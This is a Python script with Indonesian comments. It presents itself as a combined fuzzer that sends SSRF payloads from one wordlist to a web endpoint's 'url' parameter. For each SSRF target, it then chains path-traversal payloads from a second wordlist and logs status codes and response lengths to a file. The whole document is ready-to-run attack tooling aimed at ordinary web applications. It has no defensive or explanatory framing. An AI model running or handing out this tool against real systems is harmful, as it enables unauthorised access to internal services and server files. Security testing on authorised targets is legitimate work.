import requests
from urllib.parse import quote
import argparse

# Konfigurasi
base_url = "https://target.com/load"
headers = {
    "User-Agent": "Mozilla/5.0 (JagFuzz)"
}

# Logging hasil ke terminal dan file
def log_result(payload, status, length):
    output = f"[{status}] {payload} (length={length})"
    print(output)
    with open("hasil.log", "a") as f:
        f.write(output + "\n")

# Proses utama kombinasi SSRF dan Path Traversal
def fuzz_combined(ssrf_wordlist, traversal_wordlist):
    # Baca wordlist SSRF
    with open(ssrf_wordlist, "r") as ssrf_file:
        ssrf_targets = [line.strip() for line in ssrf_file if line.strip()]
    
    # Baca wordlist Traversal
    with open(traversal_wordlist, "r") as trav_file:
        traversal_paths = [line.strip() for line in trav_file if line.strip()]
    
    # Loop setiap target SSRF
    for target in ssrf_targets:
        print("=" * 60)
        print(f"[+] Menguji SSRF target: {target}")
        
        # Step 1: Uji langsung SSRF tanpa traversal
        payload = f"?url={quote(target, safe=':/?=&')}"
        try:
            r = requests.get(base_url + payload, headers=headers, timeout=5)
            log_result(payload, r.status_code, len(r.content))
        except Exception as e:
            print(f"[ERR SSRF] {target}: {e}")
            continue

        # Step 2: Lakukan traversal dari SSRF target
        print(f"\n🔍 Mulai traversal dari target: {target}\n")
        for path in traversal_paths:
            encoded_path = quote(path)
            full_url = f"{target}/?path={encoded_path}"
            payload = f"?url={quote(full_url, safe=':/?=&')}"
            try:
                r = requests.get(base_url + payload, headers=headers, timeout=5)
                log_result(payload, r.status_code, len(r.content))
            except Exception as e:
                print(f"[ERR PATH] {full_url}: {e}")

# Argumen CLI
if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Combined Fuzzer by Anggi")
    parser.add_argument("-s", "--ssrf", required=True, help="Wordlist SSRF (e.g. ssrf.txt)")
    parser.add_argument("-t", "--traversal", required=True, help="Wordlist Traversal (e.g. traversal.txt)")
    args = parser.parse_args()

    fuzz_combined(args.ssrf, args.traversal)
